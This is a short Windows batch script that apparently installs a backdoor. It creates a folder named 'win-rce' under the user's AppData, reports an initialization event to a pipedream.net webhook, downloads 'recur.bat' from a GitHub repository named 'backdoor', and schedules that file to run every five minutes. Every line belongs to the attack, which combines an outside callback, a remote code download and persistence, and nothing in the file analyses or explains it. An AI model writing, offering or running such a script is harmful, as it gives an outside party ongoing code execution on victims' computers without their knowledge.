cd C:\Users\%username%\Appdata\Local
mkdir C:\Users\%username%\Appdata\Local\win-rce
curl -d "{'event':'initalization'}" https://eojlk5hggkgar9y.m.pipedream.net
curl -O recur.bat "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/recur.bat" 
schtasks /CREATE /TN "win-rce" /TR "C:\Users\%username%\AppData\Local\win-rce\recur.bat /SC MINUTE /MO 5
